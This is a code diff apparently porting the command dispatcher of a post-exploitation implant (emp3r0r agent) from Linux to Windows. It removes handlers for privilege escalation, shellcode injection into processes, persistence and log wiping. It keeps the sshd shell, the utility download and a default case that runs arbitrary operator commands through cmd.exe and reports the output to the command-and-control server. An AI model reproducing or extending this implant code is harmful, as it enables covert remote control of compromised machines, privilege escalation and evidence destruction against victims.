@@ -1,6 +1,6 @@
-package agent
+package agentw
 
-// build +linux
+//build +windows
 
 import (
 	"context"
@@ -289,20 +289,6 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		}
 		sendResponse(out)
 
-	case "!lpe":
-		// LPE helper
-		// !lpe script_name
-		if len(cmdSlice) < 2 {
-			log.Printf("args error: %s", cmdSlice)
-			out = fmt.Sprintf("args error: %s", cmdSlice)
-			sendResponse(out)
-			return
-		}
-
-		helper := cmdSlice[1]
-		out = lpeHelper(helper)
-		sendResponse(out)
-
 	case "!sshd":
 		// sshd server
 		// !sshd id shell port args
@@ -399,66 +385,9 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		}
 		return
 
-		// GDB inject
-	case "!inject":
-		if len(cmdSlice) != 3 {
-			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
-			return
-		}
-		out = fmt.Sprintf("%s: success", cmdSlice[1])
-		pid, err := strconv.Atoi(cmdSlice[2])
-		if err != nil {
-			log.Print("Invalid pid")
-		}
-		err = InjectShellcode(pid, cmdSlice[1])
-		if err != nil {
-			out = "failed: " + err.Error()
-		}
-		sendResponse(out)
-
 		// download utils.zip
 	case "!utils":
 		out = vaccineHandler()
-		sendResponse(out)
-
-		// persistence
-	case "!persistence":
-		if len(cmdSlice) != 2 {
-			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
-			return
-		}
-		out = "Success"
-		SelfCopy()
-		if cmdSlice[1] == "all" {
-			err = PersistAllInOne()
-			if err != nil {
-				log.Print(err)
-				out = fmt.Sprintf("Result: %v", err)
-			}
-		} else {
-			out = "No such method available"
-			if method, exists := PersistMethods[cmdSlice[1]]; exists {
-				out = "Success"
-				err = method()
-				if err != nil {
-					log.Println(err)
-					out = fmt.Sprintf("Result: %v", err)
-				}
-			}
-		}
-		sendResponse(out)
-
-		// get_root
-	case "!get_root":
-		if os.Geteuid() == 0 {
-			out = "You already have root!"
-		} else {
-			err = GetRoot()
-			out = fmt.Sprintf("LPE exploit failed:\n%v", err)
-			if err == nil {
-				out = "Got root!"
-			}
-		}
 		sendResponse(out)
 
 		// upgrade
@@ -476,23 +405,9 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		}
 		sendResponse(out)
 
-		// log cleaner
-	case "!clean_log":
-		if len(cmdSlice) != 2 {
-			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
-			return
-		}
-		keyword := cmdSlice[1]
-		out = "Done"
-		err = CleanAllByKeyword(keyword)
-		if err != nil {
-			out = err.Error()
-		}
-		sendResponse(out)
-
 	default:
 		// exec cmd using os/exec normally, sends stdout and stderr back to CC
-		cmd := exec.Command("/bin/sh", "-c", strings.Join(cmdSlice, " "))
+		cmd := exec.Command("cmd.exe", "/C", strings.Join(cmdSlice, " "))
 		outCombined, err = cmd.CombinedOutput()
 		if err != nil {
 			log.Println(err)
